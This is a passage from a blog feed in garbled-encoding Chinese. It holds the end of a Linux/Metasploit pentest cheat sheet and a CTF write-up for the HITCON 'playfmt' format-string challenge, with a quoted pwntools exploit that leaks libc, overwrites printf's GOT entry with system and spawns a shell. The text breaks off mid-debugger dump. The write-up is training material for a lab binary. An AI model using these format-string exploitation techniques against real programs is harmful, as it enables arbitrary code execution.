class="headerlink" title="Exploitsæ¼æ´åˆ©ç”¨"></a>Exploitsæ¼æ´åˆ©ç”¨</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /pentest/exploits/exploit-db è¿›å…¥ç›®å½•<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i <span class="token punctuation">[</span>exploit<span class="token punctuation">]</span> æŸ¥è¯¢éœ€è¦çš„æ¼æ´<span class="token function">cat</span> exploit <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"#include"</span>æ£€æŸ¥è¿è¡Œç¯å¢ƒ<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i exploit <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f1 <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> sys <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">":"</span> -f1 <span class="token operator">|</span> <span class="token function">sort</span> -uåªä¿ç•™å¯ä»¥åœ¨linuxä¸‹è¿è¡Œçš„ä»£ç Metasploit:svn update å‡çº§./msfweb Webæ¥å£127.0.0.1:55555ã€‚../msfconsole å­—ç¬¦ä¸‹çš„Consoleã€‚<span class="token function">help</span> å¸®åŠ©show æ˜¾ç¤ºé€‰é¡¹ searc</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://www.yof3ng.xyz/categories/Linux/"/>
    
    
      <category term="Linuxé‡å®šå‘" scheme="http://www.yof3ng.xyz/tags/Linux%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    
      <category term="å¸¸ç”¨å‘½ä»¤é›†" scheme="http://www.yof3ng.xyz/tags/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ31-Hitcon-äº”</title>
    <link href="http://www.yof3ng.xyz/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/"/>
    <id>http://www.yof3ng.xyz/2018/10/31/Pwn-10æœˆ31-Hitcon-äº”/</id>
    <published>2018-10-31T12:44:52.000Z</published>
    <updated>2019-04-02T08:46:15.506Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-åæœˆ31-Hitcon-äº”"><a href="#Pwn-åæœˆ31-Hitcon-äº”" class="headerlink" title="Pwn-åæœˆ31-Hitcon-äº”"></a>Pwn-åæœˆ31-Hitcon-äº”</h1><blockquote><p>é¸½äº†å‡ å¤©ä¹‹åï¼Œç»§ç»­ç»ƒä¹ HitconğŸ˜­ğŸ†’ã€‚</p></blockquote><h2 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; åŒæ ·ï¼Œè¿™ä¸€é¢˜ä¹Ÿæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è¿™é¢˜çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯åœ¨å…¨å±€å˜é‡ï¼ˆ.bss)æ®µï¼Ÿï¼Ÿï¼Ÿä»€ä¹ˆæƒ…å†µğŸ™ƒã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ‰€ä»¥è¿™é¢˜æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡æ§åˆ¶æ ˆä¸Šå˜é‡æ¥ä¿®æ”¹Gotè¡¨ï¼Œé‚£æ„æ€æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±å¯ä»¥é€šè¿‡é—´æ¥çš„æ–¹å¼æ¥ä¿®æ”¹Gotè¡¨å†…å®¹å’¯ã€‚</p></blockquote><h3 id="æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯å¹¶ä¸”æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p><code>checksec playfmt</code>:</p><p><img src="https://i.loli.net/2018/10/31/5bd9a7693eb66.png" alt=""></p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ç®€å•è¿è¡Œä¸€ä¸‹ç¨‹åºå¯ä»¥çœ‹åˆ°ï¼Œè¿™æ¬¡çš„printfå‡½æ•°bufä¸åœ¨æ ˆä¸Šï¼Œè€Œæ˜¯åœ¨bssæ®µã€‚</p></blockquote><p><img src="https://i.loli.net/2018/10/31/5bd9a9c834154.png" alt=""></p><p>IDAçœ‹ä¸€çœ‹ï¼š</p><p><img src="https://i.loli.net/2018/10/31/5bd9ab6a202f0.png" alt=""></p><p>çš„ç¡®æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼Œå¾ˆæ˜æ˜¾å’¯ã€‚</p><p><img src="https://i.loli.net/2018/10/31/5bd9accfc0a7b.png" alt=""></p><p>ç”¨gdbè°ƒè¯•ï¼Œå¹¶ä¸”è¾“å…¥4ä¸ªaï¼Œå¯ä»¥çœ‹åˆ°bufä¸åœ¨æ ˆä¸Šã€‚</p><blockquote><p> å¼•ç”¨å¤§ä½¬çš„è¯ï¼š<code>é€šè¿‡ä¿®æ”¹æ ˆä¸­å­˜åœ¨çš„æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘æ ˆä¸Šçš„å˜é‡ï¼Œå¯ä»¥é—´æ¥åœ°å®ç°å†™gotï¼Œè¿™ç§æ–¹å¼æ˜¯ä¸€ç§å¸¸è§çš„å¥—è·¯ã€‚</code></p><p> c/c++ä¸­çš„<code>%n</code>æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œå®ƒæ˜¯è¾“å…¥æ ¼å¼åŒ–æ§åˆ¶å­—ç¬¦ï¼Œåœ¨è¿™é¢˜ä¸­å¯ä»¥ç”¨äºä¿®æ”¹æ ˆä¸­å˜é‡çš„å€¼ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥åœ¨printfå‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ ˆä¸­å˜é‡æƒ…å†µï¼š</p><p><img src="https://i.loli.net/2018/10/31/5bd9b9c7dc455.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; å¯ä»¥çœ‹åˆ°åç§»é‡ä¸º6çš„åœ°æ–¹æ˜¯ebpï¼Œè€ŒebpæŒ‡å‘äº†å¦å¤–ä¸€ä¸ªåœ°å€ï¼Œå³åç§»é‡ä¸º10çš„åœ°æ–¹ï¼Œç„¶ååˆæŒ‡å‘åç§»é‡ä¸º15çš„ä½ç½®ã€‚è¿™é‡Œæˆ‘ä»¬å…¶å®å¯ä»¥èµ°ä¸€æ­¥æ·å¾„ï¼Œé€šè¿‡è·å¾—åç§»é‡ä¸º8çš„åœ°æ–¹è¿™ä¸ªå‡½æ•°åœ°å€ï¼Œleakå‡ºlibcåŸºåœ°å€ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ­£æ˜¯å› ä¸ºç¨‹åºæ˜¯å¾ªç¯è¿è¡Œï¼Œæ‰€ä»¥ç»™äº†æˆ‘ä»¬è¶³å¤Ÿå¤šæ¬¡æ•°æ¥é—´æ¥è¦†å†™GOTè¡¨ã€‚</p><blockquote><p> è§£é¢˜é€»è¾‘ï¼ˆ<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">æ¥è‡ª23r3f</a> ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"> ebp_1 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">6</span><span class="token punctuation">,</span> å³$ebp ebp_2 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">10</span><span class="token punctuation">,</span> å³$ebpçš„å€¼åœ°å€ fmt_7 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">7</span> fmt_11 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printfå‡½æ•°æ ˆä¸­åç§»é‡ä¸º<span class="token number">11</span></code></pre><p> &nbsp; &nbsp; &nbsp; &nbsp; ebp1çš„å†…å®¹æ˜¯æŒ‡å‘ebp2çš„åœ°å€çš„æŒ‡é’ˆï¼Œè€Œebp2çš„å†…å®¹åˆæ˜¯æŒ‡å‘å…¶ä»–åœ°å€çš„æŒ‡é’ˆï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ç”¨%nå¯¹ebp1è¿›è¡Œæ“ä½œï¼Œé‚£ä¹ˆå®é™…ä¸Šä¼šä¿®æ”¹ebp2çš„å€¼ï¼Œå¦‚æœæ­¤æ—¶å†æŠŠebp2çš„å†…å®¹æ”¹æˆä¸€ä¸ªæŒ‡å‘fmt7çš„æŒ‡é’ˆï¼Œç„¶ååœ¨å¯¹ebp2è¿›è¡Œ%næ“ä½œï¼Œé‚£ä¹ˆå°±å¯ä»¥æ”¹å˜fmt7çš„å†…å®¹ï¼Œä»è€Œå®ç°äº†é—´æ¥ä¿®æ”¹æŸä¸ªåœ°å€çš„å†…å®¹ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬æŠŠfmt7çš„å†…å®¹åˆæ”¹æˆprintfçš„gotè¡¨åœ°å€ï¼Œé‚£ä¹ˆfmt7å°±æŒ‡å‘äº†printf_gotçš„åœ°å€ï¼Œå¦‚æœç”¨%sæ“ä½œï¼Œå°±å¯ä»¥æŠŠprintf_gotçš„å†…å®¹æ‰“å°å‡ºæ¥ï¼Œä»è€Œå¾—åˆ°äº†printfå‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œåˆ°äº†è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡printfå‡½æ•°æ³„æ¼å‡ºsystemçš„çœŸæ­£åœ°å€äº†ã€‚</p><p> å…·ä½“æ€è·¯ï¼š</p><pre class=" language-python"><code class="language-python"> <span class="token number">1</span><span class="token punctuation">.</span>é€šè¿‡ebp_1ä½¿ebp_2æŒ‡å‘fmt_7 <span class="token number">2</span><span class="token punctuation">.</span>é€šè¿‡ebp_2å°†fmt_7å¤„çš„å†…å®¹è¦†ç›–æˆprintf_got <span class="token number">3</span><span class="token punctuation">.</span>é€šè¿‡ebp_1ä½¿ebp_2æŒ‡å‘fmt_11 <span class="token number">4</span><span class="token punctuation">.</span>é€šè¿‡ebp_2å°†fmt_11å¤„çš„å†…å®¹ä¿®æ”¹æˆprintf_got<span class="token operator">+</span><span class="token number">2</span> <span class="token number">5</span><span class="token punctuation">.</span>é€šè¿‡fmt_7å°†printf_gotåœ°å€æ³„éœ²å‡ºæ¥ <span class="token number">6</span><span class="token punctuation">.</span>è®¡ç®—å‡ºsystemå‡½æ•°çš„åœ°å€ <span class="token punctuation">,</span>å°†systemå‡½æ•°åœ°å€å†™å…¥printfåœ¨gotè¡¨çš„åœ°å€ å…·ä½“åšæ³•æ˜¯å°† systemå‡½æ•°åœ°å€çš„å‰ä¸¤ä¸ªå­—èŠ‚å†™å…¥fmt_7<span class="token punctuation">,</span>åä¸¤ä¸ªå­—èŠ‚å†™å…¥ fmt_11 <span class="token number">7</span><span class="token punctuation">.</span>æ‰§è¡Œprintfå‡½æ•°ç›¸å½“äºæ‰§è¡Œsystemå‡½æ•° <span class="token number">8</span><span class="token punctuation">.</span>è¾“å…¥<span class="token string">"/bin/sh"</span>å­—ç¬¦ä¸²ï¼Œè®©systemå‡½æ•°ä»æ ˆä¸­å–å‚æ•°getshell</code></pre></blockquote><p>æ¥ä¸‹æ¥ç›´æ¥é€šè¿‡ç†è§£å„ä½å¤§ä½¬expçš„æ–¹å¼ï¼Œæ¥æ·±å…¥ç†è§£è¿™ä¸€é“é¢˜ï¼ˆå¤ªèœäº†æˆ‘ï¼‰ã€‚</p><h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>ä¸‰ä»½å¤§ä½¬EXPå„æœ‰ä¸åŒæŠ€å·§ï¼šåˆ†åˆ«æ¥è‡ªM4xï¼Œ23r3fï¼Œveritas501</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>__Auther__ <span class="token operator">=</span> <span class="token string">'M4x'</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Breakpoint *do_fmt+64pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "..%8$p....%6$p."...0x804a06f &lt;buf+15>:    ".11111111"0x804a079 &lt;buf+25>:    ""pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x38252e2e ('..%8')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa083d6 â—‚â€” './playfmt'16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa083e0 â—‚â€” 'NO_AT_BRIDGE=1'17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *do_fmt+64\nc"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"..%8$p....%6$p..11111111\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x28</span>success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%30684c%21$hn%1"...0x804a06f &lt;buf+15>:    "6c%22$hn2222222"...0x804a07e &lt;buf+30>:    "2"pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x36303325 ('%306')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa083d6 â—‚â€” './playfmt'16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa083e0 â—‚â€” 'NO_AT_BRIDGE=1'17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'22222222\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"11111111"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%40976c%57$hn%2"...0x804a06f &lt;buf+15>:    "c%59$hn33333333"0x804a07e &lt;buf+30>:    ""pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x39303425 ('%409')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop0c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x8048584 (play+59) â—‚â€” nop16:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x80485b1 (main+42) â—‚â€” nop17:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"33333333\0"</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"22222222"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%211c%11$hhn%31"...0x804a06f &lt;buf+15>:    "325c%7$hn444444"...0x804a07e &lt;buf+30>:    "44"pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d46930 (printf) â—‚â€” call   0xf7e1dae908:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d40c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â—‚â€” 0xf7d4693016:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d417:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“pwndbg> n0x08048540 in do_fmt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATAâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAX  0x7b38 EBX  0x0 ECX  0xffa052a0 â—‚â€” 0x20202020 ('    ') EDX  